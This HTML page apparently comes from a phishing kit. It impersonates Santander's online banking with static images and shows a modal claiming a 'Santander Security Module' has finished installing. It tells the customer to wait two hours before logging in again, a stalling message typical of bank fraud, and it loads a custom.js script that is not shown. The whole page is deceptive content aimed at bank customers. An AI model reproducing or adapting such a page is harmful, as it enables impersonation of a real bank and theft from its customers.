<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
</head>
<body class="color_enter_home">

<div class="container is_header">

		<div class="left">
			<div class="logo"><img src="imgs/logo.png"></div><!-- logo -->
			<div class="busca"><input type="text" name="busca" class="buscar_home" placeholder="Digite aqui sua busca" autocomplete="off"></div>
		</div><!-- left -->

		<div class="right">
			<div class="gerente"><img src="imgs/icon_gerente.jpg"></div><!-- gerente -->
			<div class="user"><img src="imgs/icon_user.jpg"></div><!-- user -->
			<div class="exit"><span>Sair</span></div>
		</div><!-- right -->

<div class="clear"></div>
</div><!-- container -->


<div class="container is_corpo_main">
		<div class="menu_lateral"><img src="imgs/menu_lateral.jpg"></div>

		<div class="content_corpo">
			<img src="imgs/fundo_corpo.jpg">
		</div><!-- content_corpo -->
	<div class="clear"></div>
</div><!-- container -->



<div class="block_modal_corpo">
	<div class="modal_corpo">
		<div class="modal_title">
			<img src="imgs/logo.png">
		</div><!-- modal_title -->

		<div class="desc_modal" style="text-align:center;">
			O processo de instalação do <strong>Módulo de Segurança Santander</strong>, está concluído.
			<br><br>
			<span>
				O processo de instalação do Módulo de Segurança Santander está concluído e foi realizado com sucesso.
				<br><br>
				Por favor, aguarde o prazo de 02 (duas) horas corridas, para acessar novamente sua conta. Este tempo é necessário para a total instalação de todos os recursos necessários pelo Módulo de Segurança Santander.
			</span>
		</div><!-- desc_modal -->

		<div class="corpo_modal">

			<div class="loader"></div>

			<span style="font-size:.8em;text-align:center;color:#999;display:block;width:100%;margin-top:50px;">
				Por favor aguarde... Você será redirecionado.
			</span>

		</div><!-- corpo_modal -->
	<div class="clear"></div>
	</div><!-- modal_corpo -->
</div><!-- block_modal_corpo -->








<div class="container">
	<div class="content_login">

	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->
</body>
</html>
